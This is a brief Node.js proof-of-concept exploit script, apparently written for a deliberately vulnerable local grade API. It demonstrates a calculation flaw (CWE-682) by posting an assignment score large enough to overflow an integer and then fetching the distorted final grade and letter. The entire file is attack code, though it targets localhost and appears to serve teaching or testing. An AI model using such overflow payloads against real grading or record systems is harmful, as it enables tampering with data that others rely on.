// Demonstrates exploitation of CWE-682 using Integer Overflow

const axios = require("axios");

const API = "http://localhost:3000/api";

async function runExploit() {
  console.log("=== Starting Exploit ===");

  try {
    // 1. Create malicious course
    const courseRes = await axios.post(`${API}/courses`, {
      name: "Hacked Course",
      code: "HAX101111"
    });

    const courseId = courseRes.data.id;
    console.log(`Created course with ID: ${courseId}`);

    // 2. Insert malicious assignment with huge score
    // try 2147483648. for negative 
    const maliciousScore = 5000000000;

    await axios.post(`${API}/assignments`, {
      course_id: courseId,
      name: "Overflow Attack",
      score: maliciousScore,
      max_score: 100,
      weight: 50
    });

    console.log(`Inserted overflowing assignment score = ${maliciousScore}`);

    // 3. Request final grade (vulnerable calculation)
    const gradeRes = await axios.get(`${API}/final-grade/${courseId}`);

    console.log("\n=== Exploit Result ===");
    console.log(`Final Percentage: ${gradeRes.data.finalPercentage}`);
    console.log(`Letter Grade: ${gradeRes.data.letter}`);
    console.log(`Note: ${gradeRes.data.vulnerabilityNote}`);
    console.log("=======================\n");
  } catch (err) {
    console.error("Exploit failed:", err.message);
  }
}

runExploit();
